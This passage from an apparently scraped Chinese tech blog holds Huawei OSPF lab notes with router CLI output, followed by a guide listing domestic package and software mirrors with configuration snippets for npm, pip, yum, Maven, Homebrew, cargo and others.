InLoopBack0[R5]ospf 1[R5-ospf-1]asbr-su [R5-ospf-1]asbr-summary 20.1.0.0 255.255.252.0&lt;R2&gt;dis ip routing-tableRoute Flags: R - relay, D - download to fib------------------------------------------------------------------------------Routing Tables: Public Destinations : 22 Routes : 22 Destination/Mask Proto Pre Cost Flags NextHop Interface 1.1.1.1/32 OSPF 10 1 D 123.1.1.1 GigabitEthernet0/0/0 2.2.2.2/32 Direct 0 0 D 127.0.0.1 LoopBack0 3.3.3.3/32 OSPF 10 1 D 123.1.1.3 GigabitEthernet0/0/0 4.4.4.4/32 OSPF 10 49 D 123.1.1.1 GigabitEthernet0/0/0 5.5.5.5/32 OSPF 10 1 D 25.1.1.5 GigabitEthernet0/0/1 6.6.6.6/32 OSPF 10 50 D 123.1.1.1 GigabitEthernet0/0/0 7.7.7.7/32 O_ASE 150 1 D 25.1.1.5 GigabitEthernet0/0/1 10.1.0.0/22 OSPF 10 50 D 123.1.1.1 GigabitEthernet0/0/0 14.1.1.0/24 OSPF 10 49 D 123.1.1.1 GigabitEthernet0/0/0 20.1.0.0/22 O_ASE 150 2 D 25.1.1.5 GigabitEthernet0/0/1 25.1.1.0/24 Direct 0 0 D 25.1.1.2 GigabitEthernet0/0/1 25.1.1.2/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/1 25.1.1.255/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/1 46.1.1.0/24 OSPF 10 50 D 123.1.1.1 GigabitEthernet0/0/0 57.1.1.0/24 O_ASE 150 1 D 25.1.1.5 GigabitEthernet0/0/1 123.1.1.0/24 Direct 0 0 D 123.1.1.2 GigabitEthernet0/0/0 123.1.1.2/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/0 123.1.1.255/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/0 127.0.0.0/8 Direct 0 0 D 127.0.0.1 InLoopBack0 127.0.0.1/32 Direct 0 0 D 127.0.0.1 InLoopBack0127.255.255.255/32 Direct 0 0 D 127.0.0.1 InLoopBack0255.255.255.255/32 Direct 0 0 D 127.0.0.1 InLoopBack0 静默接口当 OSPF 路由器下行链路不再连接其他的 OSPF 路由器时, 可以将接口设置为静默接口, 避免产生垃圾流量, 接口一旦被配置为静默接口, 则不会向外发送 HELLO 报文. [R4-ospf-1]silent-interface ? Cellular Cellular interface GigabitEthernet GigabitEthernet interface LoopBack LoopBack interface Serial Serial interface all Suppress and receive routing on all interfaces[R4-ospf-1]silent-interface g 0/0/0Feb 21 2024 13:50:27-08:00 R4 %%01OSPF/3/NBR_CHG_DOWN(l)[0]:Neighbor event:neighbor state changed to Down. (ProcessId=256, NeighborAddress=6.6.6.6, NeighborEvent=KillNbr, NeighborPreviousState=Full, NeighborCurrentState=Down) [R4-ospf-1]Feb 21 2024 13:50:27-08:00 R4 %%01OSPF/3/NBR_DOWN_REASON(l)[1]:Neighbor state leaves full or changed to Down. (ProcessId=256, NeighborRouterId=6.6.6.6, NeighborAreaId=16777216, NeighborInterface=GigabitEthernet0/0/0,NeighborDownImmediate reason=Neighbor Down Due to Kill Neighbor, NeighborDownPrimeReason=Passive Interface Down, NeighborChangeTime=2024-02-21 13:50:27-08:00) [R4-ospf-1][R4-ospf-1]undo silent-interface g 0/0/0 OSPF 报文认证OSPF 认证: OSPF 支持报文认证功能, 只有通过认证的 OSPF 报文才能被接收 1. 区域认证: 一个 OSPF 区域中所有的路由器在该区域下认证模式和密码一致 2. 接口认证: 相邻路由器的直连接口的认证模式和密码一致 如果两种认证方式混合使用, 优先使用接口的认证方式 区域认证区域认证, 认证模式和认证密码一定要一致 ospf 1 router-id 2.2.2.2 area 0.0.0.0 authentication-mode md5 1 plain huawei@123 [R3]ospf 1[R3-ospf-1]a 0[R3-ospf-1-area-0.0.0.0]au [R3-ospf-1-area-0.0.0.0]authentication-mode ? hmac-md5 Use HMAC-MD5 algorithm keychain Keychain authentication mode md5 Use MD5 algorithm simple Simple authentication mode[R3-ospf-1-area-0.0.0.0]authentication-mode md5 ? INTEGER&lt;1-255&gt; Key ID &lt;cr&gt; Please press ENTER to execute command [R3-ospf-1-area-0.0.0.0]authentication-mode md5 1 ? STRING&lt;1-255&gt;/&lt;20-392&gt; The password (key) cipher Encryption type (Cryptogram) plain Encryption type (Plain text)[R3-ospf-1-area-0.0.0.0]authentication-mode md5 1 p [R3-ospf-1-area-0.0.0.0]authentication-mode md5 1 plain huawei@123[R3-ospf-1-area-0.0.0.0]dis th[V200R003C00]# area 0.0.0.0 authentication-mode md5 1 plain huawei@123 network 3.3.3.3 0.0.0.0 network 123.1.1.3 0.0.0.0 #return[R1]ospf 1[R1-ospf-1]a 0[R1-ospf-1-area-0.0.0.0]au[R1-ospf-1-area-0.0.0.0]authentication-mode md5 1 plain huawei@123[R1-ospf-1-area-0.0.0.0]dis th[V200R003C00]# area 0.0.0.0 authentication-mode md5 1 plain huawei@123 network 1.1.1.1 0.0.0.0 network 14.1.1.1 0.0.0.0 network 123.1.1.1 0.0.0.0 #Return[R4-ospf-1-area-0.0.0.0]authentication-mode md5 1 plain huawei@123[R2-ospf-1-area-0.0.0.0]authentication-mode md5 1 plain huawei@123[R2-ospf-1-area-0.0.0.0]dis ospf peer b OSPF Process 1 with Router ID 2.2.2.2 Peer Statistic Information ---------------------------------------------------------------------------- Area Id Interface Neighbor id State 0.0.0.0 GigabitEthernet0/0/0 1.1.1.1 Full 0.0.0.0 GigabitEthernet0/0/0 3.3.3.3 Full 0.0.0.2 GigabitEthernet0/0/1 5.5.5.5 Full ---------------------------------------------------------------------------- 接口认证interface GigabitEthernet0/0/0 ospf authentication-mode md5 1 plain huawei@123 [R4]int g0/0/0[R4-GigabitEthernet0/0/0]ospf au [R4-GigabitEthernet0/0/0]ospf authentication-mode md5 ? INTEGER&lt;1-255&gt; Key ID &lt;cr&gt; Please press ENTER to execute command [R4-GigabitEthernet0/0/0]ospf authentication-mode md5 1 plain huawei@123[R4-GigabitEthernet0/0/0]dis th[V200R003C00]#interface GigabitEthernet0/0/0 ip address 46.1.1.4 255.255.255.0 ospf authentication-mode md5 1 plain huawei@123#return[R4]dis ospf peer brief OSPF Process 1 with Router ID 4.4.4.4 Peer Statistic Information ---------------------------------------------------------------------------- Area Id Interface Neighbor id State 0.0.0.0 Serial4/0/0 1.1.1.1 Full ----------------------------------------------------------------------------[R6]ospf 1[R6-ospf-1]a 1[R6-ospf-1-area-0.0.0.1]authentication-mode md5 1 plain huawei@123[R4]dis ospf peer brief OSPF Process 1 with Router ID 4.4.4.4 Peer Statistic Information ---------------------------------------------------------------------------- Area Id Interface Neighbor id State 0.0.0.0 Serial4/0/0 1.1.1.1 Full 0.0.0.1 GigabitEthernet0/0/0 6.6.6.6 Full ---------------------------------------------------------------------------- 虚连接虚连接可以实现让没有和骨干区域相连的非骨干区域连接到骨干区域中也可以用于实现被分割的骨干区域逻辑相连 虚连接的注意事项: 虚连接在配置时, 配置命令中为对方的 RID 虚连接只能穿越一个区域 虚连接不能穿越骨干区域 虚连接不能穿越特殊区域 如果骨干区域配置了 OSPF 区域认证, 则虚连接的接口也需要认证 虚连接只能作为网络的弥补方案, 不能作为网络设计方案 [R2-ospf-1-area-0.0.0.1]vlink-peer 10.0.3.3[R3-ospf-1-area-0.0.0.1]vlink-peer 10.0.2.2[R4-ospf-1]ping 10.0.5.5 PING 10.0.5.5: 56 data bytes, press CTRL_C to break Reply from 10.0.5.5: bytes=56 Sequence=1 ttl=252 time=60 ms Reply from 10.0.5.5: bytes=56 Sequence=2 ttl=252 time=50 ms Reply from 10.0.5.5: bytes=56 Sequence=3 ttl=252 time=30 ms Reply from 10.0.5.5: bytes=56 Sequence=4 ttl=252 time=40 ms Reply from 10.0.5.5: bytes=56 Sequence=5 ttl=252 time=30 ms --- 10.0.5.5 ping statistics --- 5 packet(s) transmitted 5 packet(s) received 0.00% packet loss round-trip min/avg/max = 30/42/60 ms&lt;R2&gt;dis ospf lsdb router self-originate OSPF Process 1 with Router ID 10.0.2.2 Area: 0.0.0.0 Link State Database Type : Router Ls id : 10.0.2.2 Adv rtr : 10.0.2.2 Ls age : 87 Len : 60 Options : ABR E seq# : 80000008 chksum : 0xa3ff Link count: 3 * Link ID: 10.0.2.2 Data : 255.255.255.255 Link Type: StubNet Metric : 0 Priority : Medium * Link ID: 24.1.1.4 Data : 24.1.1.2 Link Type: TransNet Metric : 1 * Link ID: 10.0.3.3 Data : 12.1.1.2 Link Type: Virtual Metric : 2 Area: 0.0.0.1 Link State Database Type : Router Ls id : 10.0.2.2 Adv rtr : 10.0.2.2 Ls age : 87 Len : 36 Options : ABR VIRTUAL E seq# : 80000006 chksum : 0xe428 Link count: 1 * Link ID: 12.1.1.2 Data : 12.1.1.2 Link Type: TransNet Metric : 1 影响 OSPF 邻居建立的因素OSPF 基本头中: RID: 用于标识设备的 RID.(RID 必须不同且唯一) version: 用于标识当前 OSPF 协议的版本号. AREA ID: 用于标识设备接口所属的区域 (必须相同) checksum: 校验和，用于校验报文的完整性，防止被篡改 Aulype: 认证类型，用于标识当前 OSPF 设备所使用的认证方式 Hello 头中 network mask: 表示当前接口的掩码信息.(必须相同) hello time: 表示发送 hello 报文的间隔时间 (必须相同) option: 可选项, 提供了 OSPF 的扩展功能 (必须相同) priority: 路由优先级，用于 OSPF MA 网络中的 DR 选举 (不能都为 O) dead time: 表示 OSPF 邻居设备的失效时间 (必须相同)"},{"title":"","date":"2023-12-03T05:47:00.000Z","updated":"2023-12-03T05:47:00.000Z","comments":true,"path":"notes/datacom/index.html","permalink":"https://blog.mhuig.top/notes/datacom/","excerpt":"","text":".fa-secondary{opacity:.4} 数据通信网络 数据通信网络 .prev-next{ display: none !important; }"},{"title":"Package Mirror","date":"2022-06-29T06:20:00.000Z","updated":"2022-06-29T06:20:00.000Z","comments":true,"path":"notes/package-mirror/index.html","permalink":"https://blog.mhuig.top/notes/package-mirror/","excerpt":"","text":"注意：假如所有的镜像都已经被本地 nexus 私服代理，那么对应的地址为nexus.eryajf.net/repository/***/。(这只是个域名示例，不代表实际可用！) GoConfiguration如果 go 版本用的go1.11或者go1.12，需进行如下配置： export GO111MODULE=onexport GOPROXY=\"http://nexus.eryajf.net/repository/go/\" 如果使用 go1.13以上的版本则可以用如下配置： export GOPROXY=\"http://nexus.eryajf.net/repository/go/\"GONOPROXY=\"gitlab.eryajf.net\"GONOSUMDB=\"gitlab.eryajf.net\"GOPRIVATE=\"gitlab.eryajf.net\"GOSUMDB=\"sum.golang.google.cn\" 关于如上两个版本配置差异，以及配置参数详解可参考：https://wiki.eryajf.net/pages/4941.html Mirrors Aliyun https://mirrors.aliyun.com/goproxy/ Proxy-cn https://goproxy.cn Proxy-io https://proxy.golang.com.cn Baidu https://goproxy.bj.bcebos.com/ Tencent https://mirrors.cloud.tencent.com/go/ HUAWEI https://repo.huaweicloud.com/repository/goproxy/ 其中GOSUMDB在国内可用的两个镜像分别如下： Google https://sum.golang.google.cn/ sumdb-io https://gosum.io/ NpmConfiguration配置npm代理，需进行如下配置： # npm配置$ echo 'registry=http://nexus.eryajf.net/repository/npm' &gt; ~/.npmrc# 查看$ npm config get registryhttp://nexus.eryajf.net/repository/npm# yarn配置$ echo 'registry \"http://nexus.eryajf.net/repository/npm\"' &gt; ~/.yarnrc# 查看$ yarn config get registryhttp://nexus.eryajf.net/repository/npm Mirrors Taobao https://registry.npm.taobao.org但是请注意如下一个消息： 淘宝 npm 域名即将切换 &amp;&amp; npmmirror 重构升级：即原来的淘宝 npm 域名将停止解析，因此所有依赖此域名的都需要进行更改。 域名切换规则： http://npm.taobao.org=&gt; http://npmmirror.com http://registry.npm.taobao.org=&gt; http://registry.npmmirror.com HUAWEI https://repo.huaweicloud.com/repository/npm/ Tencent http://mirrors.cloud.tencent.com/npm/ 浙江大学 http://mirrors.zju.edu.cn/npm/ 南京邮电 https://mirrors.njupt.edu.cn/nexus/repository/npm/ npmjs https://registry.npmjs.org PipConfiguration配置Python代理，需进行如下配置： $ mkdir ~/.pip$ cat &gt; ~/.pip/pip.conf &lt;&lt; EOF[global]timeout = 60trusted-host = nexus.eryajf.netindex-url = http://nexus.eryajf.net/repository/pypi/simpleEOF 注意：通常在配置文件后边，我们会添加一个simple。 # 简洁配置方式 1pip config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple# 简洁配置方式 2 pip3 install --upgrade -i https://pypi.tuna.tsinghua.edu.cn/simple yt-dlp Mirrors目前代理外部私仓有： Aliyun http://mirrors.aliyun.com/pypi/ douban http://pypi.douban.com/ 清华 https://pypi.tuna.tsinghua.edu.cn/ 163 https://mirrors.163.com/pypi HUAWEI https://repo.huaweicloud.com/repository/pypi Tencent https://mirrors.cloud.tencent.com/pypi/ 北大 https://mirrors.pku.edu.cn/pypi/ 南阳理工 https://mirror.nyist.edu.cn/pypi/ 大连东软 http://mirrors.neusoft.edu.cn/pypi/web/ 哈尔滨工业大学 https://mirrors.hit.edu.cn/pypi/web/ 上海交通大学 https://mirror.sjtu.edu.cn/pypi/web/simple/ ComposerComposer 是 PHP 的一个依赖管理工具，需要 PHP 5.3.2 以上才能运行。 Configuration配置PHP代理，需进行如下配置： 全局配置（推荐） 所有项目都会使用该镜像地址：composer config -g repo.packagist composer https://mirrors.aliyun.com/composer/ 取消配置：composer config -g --unset repos.packagist 项目配置 仅修改当前工程配置，仅当前工程可使用该镜像地址：composer config repo.packagist composer https://mirrors.aliyun.com/composer/ 取消配置：composer config --unset repos.packagist 参考：https://developer.aliyun.com/composer Mirrors目前代理外部私仓有： Aliyun https://mirrors.aliyun.com/composer/ Tencent https://mirrors.cloud.tencent.com/composer/ HUAWEI https://mirrors.huaweicloud.com/repository/php/ Packagist https://packagist.phpcomposer.com 上海交通 https://packagist.mirrors.sjtug.sjtu.edu.cn RubygemsRubyGems 是 Ruby 的一个包管理器，它提供一个分发 Ruby 程序和库的标准格式，还提供一个管理程序包安装的工具。 Configuration配置Ruby代理，需进行如下配置： # 首先，查看当前源：$ gem sources -l*** CURRENT SOURCES ***https://rubygems.org/# 接着，移除 https://rubygems.org/，并添加国内下载源 https://gems.ruby-china.com/。$ gem sources --remove https://rubygems.org/$ gem sources -a https://gems.ruby-china.com/$ gem sources -l*** CURRENT SOURCES ***https://gems.ruby-china.com/# 请确保只有 gems.ruby-china.com$ gem install rails 参考：https://www.runoob.com/ruby/ruby-rubygems.html Mirrors目前代理外部私仓有： Aliyun https://mirrors.aliyun.com/rubygems/ Tencent https://mirrors.cloud.tencent.com/rubygems/ HUAWEI https://repo.huaweicloud.com/repository/rubygems/ 清华 https://mirrors.tuna.tsinghua.edu.cn/rubygems/ 中科大 https://mirrors.ustc.edu.cn/rubygems/ 北京外国语大学 https://mirrors.bfsu.edu.cn/rubygems/ 哈尔滨工业大学 https://mirrors.hit.edu.cn/rubygems/ MavenConfigurationJava 系的工具版本规范如下： JDK：1.8.0_292 MVN：3.3.9 配置 Maven 代理，参考配置文件： settings.xml Mirrors HUAWEI https://repo.huaweicloud.com/repository/maven/ Maven Central Repository https://repo1.maven.org/maven2/ Aliyun http://maven.aliyun.com/nexus/content/groups/public/ Tencent https://mirrors.cloud.tencent.com/maven/ 南京邮电 https://mirrors.njupt.edu.cn/nexus/repository/maven-central Apache Maven https://repo.maven.apache.org/maven2 https://repository.apache.org/content/groups/snapshots https://repository.apache.org/content/groups/staging/ https://repository.apache.org/content/groups/public/ confluent http://packages.confluent.io/maven/ cloudera http://repo.hortonworks.com/content/repositories/releases jboss https://repository.jboss.org/nexus/content/groups/public Lss233's.Mirror（供 Minecraft 开发使用） http://lss233.littleservice.cn/repositories/minecraft YumConfiguration如果CentOS服务器要接入私服yum源，则清空本地 /etc/yum.repos.d的内容，添加如下内容： $ cat &gt;&gt; /etc/yum.repos.d/nexus.repo &lt;&lt; 'EOF'[nexus]name=Nexus Repositorybaseurl=http://nexus.eryajf.net/repository/yum/$releasever/os/$basearch/enabled=1gpgcheck=0[nexus-local]name=Nexus Repositorybaseurl=http://nexus.eryajf.net/repository/eryajf-yum-local/enabled=1gpgcheck=0EOF 然后执行如下命令： yum clean allyum makecache Mirrors目前代理外部源： Aliyun https://mirrors.aliyun.com/centos/ HUAWEI https://repo.huaweicloud.com/centos/ Tencent https://mirrors.cloud.tencent.com/centos/ 北京交通 https://mirror.bjtu.edu.cn/centos/ 东北大学 http://mirror.neu.edu.cn/centos/ 兰州大学 https://mirror.lzu.edu.cn/centos/ 清华 https://mirrors.tuna.tsinghua.edu.cn/centos/ 华中科技大学 https://mirrors.ustc.edu.cn/centos/ 浙江大学 http://mirrors.zju.edu.cn/centos/ souhu http://mirrors.sohu.com/centos/ 163： http://mirrors.163.com/centos/ RemiRemi repository 是包含最新版本 PHP 和 MySQL 包的 Linux 源，由 Remi 提供维护。 官方地址：https://rpms.remirepo.net/ Configuration详情参考：https://wiki.eryajf.net/pages/f35986 yum install -y epel-releaseyum install -y https://mirrors.tuna.tsinghua.edu.cn/remi/enterprise/remi-release-7.rpm Mirrors目前代理外部源： Aliyun https://mirrors.aliyun.com/remi/ HUAWEI https://repo.huaweicloud.com/remi/ 清华 https://mirrors.tuna.tsinghua.edu.cn/remi/ 中科大 https://mirrors.ustc.edu.cn/remi/ 上海交通 http://ftp.sjtu.edu.cn/remi/ 首都在线 http://mirrors.yun-idc.com/remi/ 北京外国语大学 https://mirrors.bfsu.edu.cn/remi/ EpelEPEL 的全称叫 Extra Packages for Enterprise Linux。EPEL 是由 Fedora 社区打造，为 RHEL 及衍生发行版如 CentOS、Scientific Linux 等提供高质量软件包的项目。 官方地址：https://docs.fedoraproject.org/en-US/epel/ Configuration# 备份mv /etc/yum.repos.d/epel.repo /etc/yum.repos.d/epel.repo.backupmv /etc/yum.repos.d/epel-testing.repo /etc/yum.repos.d/epel-testing.repo.backup# 下载wget -O /etc/yum.repos.d/epel.repo http://mirrors.aliyun.com/repo/epel-7.repo Mirrors目前代理外部源： Aliyun https://mirrors.aliyun.com/epel/ Tencent https://mirrors.cloud.tencent.com/epel/ HUAWEI https://repo.huaweicloud.com/epel/ 清华 https://mirrors.tuna.tsinghua.edu.cn/epel/ 中科大 https://mirrors.ustc.edu.cn/epel/ 浙江大学 http://mirrors.zju.edu.cn/epel/ 兰州大学 https://mirror.lzu.edu.cn/epel/ 上海交通 http://ftp.sjtu.edu.cn/epel/ 首都在线 http://mirrors.yun-idc.com/epel/ 大连东软 http://mirrors.neusoft.edu.cn/epel/ 大连理工 http://mirror.dlut.edu.cn/epel/ 南京邮电 http://mirrors.njupt.edu.cn/epel/ 重庆大学 https://mirrors.cqu.edu.cn/epel/ 北京外国语大学 https://mirrors.bfsu.edu.cn/epel/ HomebrewConfiguration如果你使用了 zsh，那么配置方式如下： echo 'export HOMEBREW_BREW_GIT_REMOTE=\"https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/brew.git\"' &gt;&gt; ~/.zshrcecho 'export HOMEBREW_CORE_GIT_REMOTE=\"https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/homebrew-core.git\"' &gt;&gt; ~/.zshrcecho 'export HOMEBREW_BOTTLE_DOMAIN=\"https://mirrors.tuna.tsinghua.edu.cn/homebrew-bottles\"' &gt;&gt; ~/.zshrcsource ~/.zshrcbrew update 参考：Homebrew 替换国内镜像源 Mirrors Aliyun https://mirrors.aliyun.com/homebrew/ Tencent https://mirrors.cloud.tencent.com/homebrew/ 清华： https://mirrors.tuna.tsinghua.edu.cn/help/homebrew/ 重庆大学 https://mirrors.cqu.edu.cn/homebrew/ 北京外国语大学 https://mirrors.bfsu.edu.cn/help/homebrew/ cargorust 包管理镜像源 Configuration修改文件~/.cargo/config (没有则新建) [source.crates-io]replace-with = 'rsproxy'[source.rsproxy]registry = \"https://rsproxy.cn/crates.io-index\"[registries.rsproxy]index = \"https://rsproxy.cn/crates.io-index\"[net]git-fetch-with-cli = true Mirrors 字节 https://rsproxy.cn/crates.io-index 中国科学技术大学 git://mirrors.ustc.edu.cn/crates.io-index 清华： https://mirrors.tuna.tsinghua.edu.cn/git/crates.io-index.git 上海交通大学 https://mirrors.sjtug.sjtu.edu.cn/git/crates.io-index 阿里云 https://code.aliyun.com/rustcc/crates.io-index 北京外国语大学 https://mirrors.bfsu.edu.cn/git/crates.io-index.git rustcc 社区 git://crates.rustcc.cn/crates.io-index Software-Mirror还有一些软件，直接通过官方下载比较困难，也整理出方便下载的国内优质镜像。 DockerOfficial https://docs.docker.com/engine/install/ Mirrors Aliyun https://developer.aliyun.com/mirror/docker-ce Tencent https://mirrors.cloud.tencent.com/docker-ce/ HUAWEI https://repo.huaweicloud.com/docker-ce/ 北大 https://mirrors.pku.edu.cn/docker-ce/ 清华 https://mirrors.tuna.tsinghua.edu.cn/docker-ce/ 中科大 https://mirrors.ustc.edu.cn/docker-ce/ 西北农林科技大学 https://mirrors.nwsuaf.edu.cn/docker-ce/ 浙江大学 http://mirrors.zju.edu.cn/docker-ce/ 北京外国语大学 https://mirrors.bfsu.edu.cn/docker-ce/ 哈尔滨工业大学 https://mirrors.hit.edu.cn/docker-ce 上海交通 https://mirror.sjtu.edu.cn/docker-ce/ KubernetesOfficial https://kubernetes.io/releases/download/ Mirrors Aliyun https://developer.aliyun.com/mirror/kubernetes Tencent https://mirrors.cloud.tencent.com/kubernetes/ HUAWEI https://repo.huaweicloud.com/kubernetes/ 北大 https://mirrors.pku.edu.cn/kubernetes/ 清华 https://mirrors.tuna.tsinghua.edu.cn/kubernetes/ 中科大 https://mirrors.ustc.edu.cn/kubernetes/ K3sOfficial https://github.com/k3s-io/k3s/releases/ Mirrors 清华 https://mirrors.tuna.tsinghua.edu.cn/github-release/k3s-io/k3s/ 北京外国语大学 https://mirrors.bfsu.edu.cn/github-release/k3s-io/k3s/ MinikubeOfficial https://github.com/kubernetes/minikube/releases Mirrors 清华 https://mirrors.tuna.tsinghua.edu.cn/github-release/kubernetes/minikube/ 北京外国语大学 https://mirrors.bfsu.edu.cn/github-release/kubernetes/minikube/ HelmOfficial https://helm.sh/docs/intro/install/ Mirrors HUAWEI https://repo.huaweicloud.com/helm/ HarborOfficial https://github.com/goharbor/harbor/releases Mirrors 清华 https://mirrors.tuna.tsinghua.edu.cn/github-release/goharbor/harbor/ 北京外国语大学 https://mirrors.bfsu.edu.cn/github-release/goharbor/harbor/ JenkinsOfficial 安装包：https://www.jenkins.io/zh/download/ 插件：https://plugins.jenkins.io/ Mirrors Aliyun 安装包：https://mirrors.aliyun.com/jenkins/war/ 插件：https://mirrors.aliyun.com/jenkins/plugins/ Tencent 安装包：https://mirrors.cloud.tencent.com/jenkins/war/ 插件：https://mirrors.cloud.tencent.com/jenkins/plugins/ HUAWEI 安装包：https://repo.huaweicloud.com/jenkins/war/ 插件：https://repo.huaweicloud.com/jenkins/plugins/ 中科大 安装包：https://mirrors.ustc.edu.cn/jenkins/war/ 插件：https://mirrors.ustc.edu.cn/jenkins/plugins/ 清华 安装包：https://mirrors.tuna.tsinghua.edu.cn/jenkins/war/ 插件：https://mirrors.tuna.tsinghua.edu.cn/jenkins/plugins/ 北京外国语大学 安装包：https://mirrors.bfsu.edu.cn/jenkins/war/ 插件：https://mirrors.bfsu.edu.cn/jenkins/plugins/ GitLab-ceOfficial https://packages.gitlab.com/gitlab/gitlab-ce Mirrors Aliyun https://mirrors.aliyun.com/gitlab-ce/ Tencent https://mirrors.cloud.tencent.com/gitlab-ce/ 清华 https://mirrors.tuna.tsinghua.edu.cn/gitlab-ce/ 北京外国语大学 https://mirrors.bfsu.edu.cn/gitlab-ce/ GitLab-runnerOfficial https://docs.gitlab.com/runner/install/ Mirrors Tencent https://mirrors.cloud.tencent.com/gitlab-runner/ 清华 https://mirrors.tuna.tsinghua.edu.cn/gitlab-runner/ 北京外国语大学 https://mirrors.bfsu.edu.cn/gitlab-runner/ ElasticSearchOfficial https://www.elastic.co/cn/downloads/elasticsearch Mirrors elastic 中文社区 https://elasticsearch.cn/download/ Aliyun https://mirrors.aliyun.com/elasticstack/ HUAWEI https://repo.huaweicloud.com/elasticsearch/ Tencent https://mirrors.cloud.tencent.com/elasticstack/ 清华 https://mirrors.tuna.tsinghua.edu.cn/elasticstack/ 南京邮电 http://mirrors.njupt.edu.cn/elasticstack/ LogstashOfficial https://www.elastic.co/cn/downloads/logstash Mirrors elastic 中文社区 https://elasticsearch.cn/download/ HUAWEI https://repo.huaweicloud.com/logstash/ KibanaOfficial https://www.elastic.co/cn/downloads/kibana Mirrors elastic 中文社区 https://elasticsearch.cn/download/ HUAWEI https://repo.huaweicloud.com/kibana/ FilebeatOfficial https://www.elastic.co/cn/downloads/beats/filebeat Mirrors elastic 中文社区 https://elasticsearch.cn/download/ HUAWEI https://repo.huaweicloud.com/filebeat/ MySQLOfficial https://dev.mysql.com/downloads/repo/yum/ Mirrors Aliyun https://developer.aliyun.com/mirror/mysql HUAWEI https://repo.huaweicloud.com/mysql/Downloads/ Tencent https://mirrors.cloud.tencent.com/mysql/ Souhu http://mirrors.sohu.com/mysql/ 清华 https://mirrors.tuna.tsinghua.edu.cn/mysql/ 中科大 https://mirrors.ustc.edu.cn/mysql-ftp/Downloads/ 南阳理工 https://mirror.nyist.edu.cn/mysql/ 北京外国语大学 https://mirrors.bfsu.edu.cn/mysql/ MariaDBOfficial https://mariadb.org/download/ Mirrors Aliyun https://developer.aliyun.com/mirror/mariadb Tencent https://mirrors.cloud.tencent.com/mariadb/ HUAWEI https://repo.huaweicloud.com/mariadb/ 清华 https://mirrors.tuna.tsinghua.edu.cn/mariadb/ 中科大 https://mirrors.ustc.edu.cn/mariadb/ PerconaOfficial https://www.percona.com/downloads/ Mirrors Tencent https://mirrors.cloud.tencent.com/percona/ 清华 https://mirrors.tuna.tsinghua.edu.cn/percona/ 中科大 https://mirrors.ustc.edu.cn/percona/ MongoDBOfficial https://www.mongodb.com/try/download/community Mirrors Aliyun https://developer.aliyun.com/mirror/mongodb Tencent https://mirrors.cloud.tencent.com/mongodb/ 163 http://mirrors.163.com/mongodb/ 清华 https://mirrors.tuna.tsinghua.edu.cn/mongodb/ 北京外国语大学 https://mirrors.bfsu.edu.cn/mongodb/ 上海交通大学 https://mirrors.sjtug.sjtu.edu.cn/mongodb/ RedisOfficial https://redis.io/download/ Mirrors HUAWEI https://repo.huaweicloud.com/redis/ PostgreSQLOfficial https://www.postgresql.org/download/ Mirrors Aliyun https://mirrors.aliyun.com/postgresql/ Tencen https://mirrors.cloud.tencent.com/postgresql/ HUAWEI https://repo.huaweicloud.com/postgresql/ 清华 https://mirrors.tuna.tsinghua.edu.cn/postgresql/ 中科大 https://mirrors.ustc.edu.cn/postgresql/ 浙江大学 http://mirrors.zju.edu.cn/postgresql/ 南阳理工 https://mirror.nyist.edu.cn/postgresql/ 北京外国语大学 https://mirrors.bfsu.edu.cn/postgresql/ GolangOfficial https://go.dev/dl/ Mirrors Go 语言中文网 https://studygolang.com/dl Aliyun https://mirrors.aliyun.com/golang/ Proxy-io https://gomirrors.org/ 中科大 https://mirrors.ustc.edu.cn/golang/ NodeOfficial https://nodejs.org/zh-cn/download/ Mirrors Aliyun https://mirrors.aliyun.com/nodejs-release/ HUAWEI https://repo.huaweicloud.com/nodejs/ Tencent https://mirrors.cloud.tencent.com/nodejs-release/ 清华 https://mirrors.tuna.tsinghua.edu.cn/nodejs-release/ 中科大 https://mirrors.ustc.edu.cn/node/ 北京外国语大学 https://mirrors.bfsu.edu.cn/nodejs-release/ YarnOfficial https://github.com/yarnpkg/yarn/releases Mirrors HUAWEI https://repo.huaweicloud.com/yarn/ PythonOfficial https://www.python.org/downloads/ Mirrors HUAWEI https://repo.huaweicloud.com/python/ 北京交通 https://mirror.bjtu.edu.cn/python/ RustOfficial https://forge.rust-lang.org/infra/other-installation-methods.html Mirrors 清华 https://mirrors.tuna.tsinghua.edu.cn/rustup/ 上海交通大学 https://mirror.sjtu.edu.cn/rust-static/ ZabbixOfficial https://www.zabbix.com/cn/download Mirrors Aliyun https://mirrors.aliyun.com/zabbix HUAWEI https://repo.huaweicloud.com/zabbix/ Tencent https://mirrors.cloud.tencent.com/zabbix/ 清华 https://mirrors.tuna.tsinghua.edu.cn/zabbix/ 南京邮电 http://mirrors.njupt.edu.cn/zabbix/ 西北农林科技大学 https://mirrors.nwsuaf.edu.cn/zabbix/ 南阳理工 https://mirror.nyist.edu.cn/zabbix/ 北京外国语大学 https://mirrors.bfsu.edu.cn/zabbix/ PrometheusOfficial https://grafana.com/grafana/download Mirrors 清华 https://mirrors.tuna.tsinghua.edu.cn/github-release/prometheus/prometheus/ 北京外国语大学 https://mirrors.bfsu.edu.cn/github-release/prometheus/prometheus/ 上海交通大学 https://mirror.sjtu.edu.cn/github-release/prometheus/?mirror_intel_list此地址下包含了 prometheus 应用体系的大部分软件，包含： alertmanager blackbox_exporter consul_exporter graphite_exporter haproxy_exporter memcached_exporter mysqld_exporter node_exporter prometheus pushgateway statsd_exporter GrafanaOfficial https://grafana.com/grafana/download Mirrors Aliyun https://developer.aliyun.com/mirror/grafana HUAWEI https://repo.huaweicloud.com/grafana/ Tencent https://mirrors.cloud.tencent.com/grafana/ 清华 https://mirrors.tuna.tsinghua.edu.cn/grafana/ 西北农林科技大学 https://mirrors.nwsuaf.edu.cn/grafana/ 北京外国语大学 https://mirrors.bfsu.edu.cn/grafana/ 哈尔滨工业大学 https://mirrors.hit.edu.cn/grafana/ PinpointOfficial https://github.com/pinpoint-apm/pinpoint/releases Mirrors HUAWEI https://repo.huaweicloud.com/pinpoint/ ApacheOfficial https://httpd.apache.org/download.cgi Mirrors Aliyun https://developer.aliyun.com/mirror/apache HUAWEI https://repo.huaweicloud.com/apache/ Tencent https://mirrors.cloud.tencent.com/apache/ 